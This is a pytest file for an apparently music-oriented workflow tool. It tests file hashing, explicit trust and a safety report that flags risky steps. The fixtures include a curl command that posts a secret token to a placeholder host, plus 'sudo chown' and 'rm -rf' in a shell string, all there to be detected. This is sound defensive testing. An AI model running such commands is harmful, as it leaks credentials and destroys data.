from __future__ import annotations

import textwrap
from pathlib import Path

import pytest

from rifferr.appdb import AppDB
from rifferr.core.workflow import load_workflow, safety_report
from rifferr.trust import WorkflowFileError, read_workflow_file, trust_file, workflow_hash


def test_SECURITY_10_hash_is_sha256_of_file_bytes(tmp_path: Path) -> None:
    import hashlib

    f = tmp_path / "wf.yaml"
    f.write_bytes(b"name: t\r\nsteps: []\r\n")  # CRLF kept: no newline translation
    text, sha = read_workflow_file(f)
    assert sha == hashlib.sha256(f.read_bytes()).hexdigest()
    assert workflow_hash(text) == sha


def test_SECURITY_10_non_utf8_file_is_refused(tmp_path: Path) -> None:
    f = tmp_path / "wf.yaml"
    f.write_bytes(b"name: \xff\n")
    with pytest.raises(WorkflowFileError, match="not UTF-8"):
        read_workflow_file(f)


def test_SECURITY_12_trust_is_explicit_and_per_content(tmp_path: Path) -> None:
    db = AppDB(tmp_path / "a.db")
    f = tmp_path / "wf.yaml"
    f.write_text("name: t\nsteps: []\n")
    sha = workflow_hash(f.read_bytes())
    assert not db.is_trusted(sha)
    assert trust_file(db, f, "cli") == sha
    assert db.is_trusted(sha)
    f.write_text("name: t\nsteps: []\n# edit\n")
    assert not db.is_trusted(workflow_hash(f.read_bytes()))


def test_SECURITY_12_examples_ship_untrusted(tmp_path: Path) -> None:
    db = AppDB(tmp_path / "a.db")
    examples = Path(__file__).parents[2] / "examples" / "workflows"
    for f in sorted(examples.glob("*.y*ml")):
        assert not db.is_trusted(read_workflow_file(f)[1])


def report(src: str) -> list[tuple[str, str, str]]:
    wf, _ = load_workflow(textwrap.dedent(src), "wf.yaml")
    return [(f.step_id, f.kind, f.detail) for f in safety_report(wf).findings]


def test_SECURITY_11_lists_commands_tools_secrets_and_scripts() -> None:
    src = """\
    name: t
    steps:
      - id: up
        uses: shell
        with:
          run: [curl, -d, "$RIFFERR_SECRET_TOKEN", "https://x"]
          secrets: [token]
      - id: clean
        uses: shell
        with: { run: [./scripts/tidy.sh, "$path"] }
      - id: sh
        uses: shell
        with: { run: "sudo chown me $RIFFERR_ALBUM_DIR && /usr/bin/rm -rf x", shell: true }
      - id: import
        uses: beets.import
        with: { path: /in }
    """
    assert report(src) == [
        ("up", "command", "curl -d '$RIFFERR_SECRET_TOKEN' https://x"),
        ("up", "network_tool", "curl"),
        ("up", "secret", "exposes secret 'token'"),
        ("clean", "command", "./scripts/tidy.sh '$path'"),
        (
            "clean",
            "local_script",
            "./scripts/tidy.sh: trust covers the workflow text only, not this script's content",
        ),
        ("sh", "command", "sudo chown me $RIFFERR_ALBUM_DIR && /usr/bin/rm -rf x"),
        ("sh", "shell_string", "runs through /bin/sh -c"),
        ("sh", "destructive", "sudo"),
        ("sh", "destructive", "chown"),
        ("sh", "destructive", "rm"),
    ]


def test_SECURITY_11_interpreter_scripts_and_data_paths() -> None:
    src = """\
    name: t
    steps:
      - {id: a, uses: shell, with: {run: [python3, ~/bin/tag.py, /music/in]}}
      - {id: b, uses: shell, with: {run: [sh, -c, "echo hi"]}}
    """
    kinds = [(s, k, d.split(":")[0]) for s, k, d in report(src) if k == "local_script"]
    assert kinds == [("a", "local_script", "~/bin/tag.py")]


def test_SECURITY_11_clean_workflow_has_only_command_entries() -> None:
    src = "name: t\nsteps:\n  - {id: a, uses: shell, with: {run: [ls, -la, $path]}}\n"
    assert [k for _, k, _ in report(src)] == ["command"]
